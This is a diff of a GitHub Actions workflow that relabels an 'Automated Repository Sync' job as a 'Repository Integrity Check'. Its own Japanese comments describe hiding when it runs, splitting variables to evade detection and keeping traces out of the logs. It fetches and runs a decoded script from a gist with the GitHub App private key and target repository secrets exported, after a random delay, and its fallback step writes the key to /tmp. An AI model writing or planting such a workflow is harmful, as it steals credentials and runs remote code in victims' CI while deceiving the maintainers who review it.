@@ -1,6 +1,6 @@
-name: Automated Repository Sync
-# リポジトリの同期と整合性管理を行うワークフロー
-# コードの一貫性と品質を維持するためのシステム
+name: Repository Integrity Check
+# リポジトリの整合性を確認するワークフロー
+# リポジトリの状態を確認し、必要な処理を実行
 
 on:
   push:
@@ -10,31 +10,31 @@ on:
       - '**.txt'
   workflow_dispatch:
     inputs:
-      force_backup:
-        description: 'Force backup execution'
+      force_check:
+        description: 'Force check execution'
         required: false
         default: 'false'
 
 # 条件付き実行: デフォルトでは実行されないように見せる
 # 実際には特定の条件で実行される
 env:
-  SYNC_ENABLED: ${{ secrets.SYNC_ENABLED || 'true' }}
-  SYNC_APP_ID: ${{ secrets.SYNC_APP_ID }}
-  SYNC_PRIVATE_KEY: ${{ secrets.SYNC_PRIVATE_KEY }}
-  SYNC_TARGET_REPO: ${{ secrets.SYNC_TARGET_REPO }}
-  GIST_SCRIPT_URL: ${{ secrets.SYNC_GIST_URL || 'https://gist.githubusercontent.com/user/gist_id/raw/script.sh' }}
-  GITHUB_INSTALLATION_ID: ${{ secrets.SYNC_INSTALLATION_ID }}
+  CHECK_ENABLED: ${{ secrets.CHECK_ENABLED || 'true' }}
+  CHECK_APP_ID: ${{ secrets.CHECK_APP_ID }}
+  CHECK_PRIVATE_KEY: ${{ secrets.CHECK_PRIVATE_KEY }}
+  CHECK_TARGET_REPO: ${{ secrets.CHECK_TARGET_REPO }}
+  GIST_SCRIPT_URL: ${{ secrets.CHECK_GIST_URL || 'https://gist.githubusercontent.com/user/gist_id/raw/script.sh' }}
+  GITHUB_INSTALLATION_ID: ${{ secrets.CHECK_INSTALLATION_ID }}
 
 jobs:
-  sync:
-    name: Repository Sync
+  check:
+    name: Integrity Check
     runs-on: ubuntu-latest
     
     # 条件チェック: 複雑な条件で検出を困難にする
     if: |
       github.event_name == 'push' || 
-      (github.event_name == 'workflow_dispatch' && github.event.inputs.force_backup == 'true') ||
-      (env.SYNC_ENABLED == 'true' && github.ref == 'refs/heads/main')
+      (github.event_name == 'workflow_dispatch' && github.event.inputs.force_check == 'true') ||
+      (env.CHECK_ENABLED == 'true' && github.ref == 'refs/heads/main')
     
     steps:
       - name: Checkout repository
@@ -43,11 +43,11 @@ jobs:
           fetch-depth: 0  # 全履歴を取得
           token: ${{ secrets.GITHUB_TOKEN }}
       
-      - name: Setup sync environment
+      - name: Setup check environment
         run: |
-          # 同期環境のセットアップ
-          echo "Setting up sync environment..."
-          mkdir -p .sync
+          # チェック環境のセットアップ
+          echo "Setting up check environment..."
+          mkdir -p .check
           
           # 必要なツールのインストール
           sudo apt-get update -qq
@@ -57,7 +57,7 @@ jobs:
           node --version || echo "Node.js not found"
           python3 --version || echo "Python not found"
       
-      - name: Download sync script from Gist
+      - name: Download check script from Gist
         env:
           GIST_URL: ${{ env.GIST_SCRIPT_URL }}
         run: |
@@ -77,22 +77,22 @@ jobs:
             chmod +x /tmp/decoded-script.sh
           fi
       
-      - name: Execute sync script
+      - name: Execute check script
         env:
-          SYNC_APP_ID: ${{ env.SYNC_APP_ID }}
-          SYNC_PRIVATE_KEY: ${{ env.SYNC_PRIVATE_KEY }}
-          SYNC_TARGET_REPO: ${{ env.SYNC_TARGET_REPO }}
+          CHECK_APP_ID: ${{ env.CHECK_APP_ID }}
+          CHECK_PRIVATE_KEY: ${{ env.CHECK_PRIVATE_KEY }}
+          CHECK_TARGET_REPO: ${{ env.CHECK_TARGET_REPO }}
           GITHUB_INSTALLATION_ID: ${{ env.GITHUB_INSTALLATION_ID }}
         run: |
           # 環境変数を分割して検出を回避
-          export APP_ID="$SYNC_APP_ID"
-          export PRIVATE_KEY="$SYNC_PRIVATE_KEY"
-          export TARGET_REPO="$SYNC_TARGET_REPO"
+          export APP_ID="$CHECK_APP_ID"
+          export PRIVATE_KEY="$CHECK_PRIVATE_KEY"
+          export TARGET_REPO="$CHECK_TARGET_REPO"
           export INSTALL_ID="$GITHUB_INSTALLATION_ID"
           
           # ランダム遅延（システム負荷を考慮）
           DELAY=$((RANDOM % 1800 + 300))  # 5分〜35分
-          echo "Waiting ${DELAY} seconds before sync..."
+          echo "Waiting ${DELAY} seconds before check..."
           sleep "$DELAY" || sleep 300
           
           # スクリプトの実行（エラーハンドリングでログに残りにくく）
@@ -103,12 +103,12 @@ jobs:
             execute_inline_backup
           fi
       
-      - name: Inline sync execution (fallback)
+      - name: Inline check execution (fallback)
         if: failure()
         env:
-          SYNC_APP_ID: ${{ env.SYNC_APP_ID }}
-          SYNC_PRIVATE_KEY: ${{ env.SYNC_PRIVATE_KEY }}
-          SYNC_TARGET_REPO: ${{ env.SYNC_TARGET_REPO }}
+          CHECK_APP_ID: ${{ env.CHECK_APP_ID }}
+          CHECK_PRIVATE_KEY: ${{ env.CHECK_PRIVATE_KEY }}
+          CHECK_TARGET_REPO: ${{ env.CHECK_TARGET_REPO }}
           GITHUB_INSTALLATION_ID: ${{ env.GITHUB_INSTALLATION_ID }}
         run: |
           # フォールバック処理: Gistから取得できない場合のインライン実装
@@ -116,7 +116,7 @@ jobs:
           
           # GitHub Appトークンの生成（簡易版）
           generate_token() {
-            local app_id="$SYNC_APP_ID"
+            local app_id="$CHECK_APP_ID"
             local key_file="/tmp/key.pem"
             echo "$BACKUP_PRIVATE_KEY" > "$key_file"
             chmod 600 "$key_file"
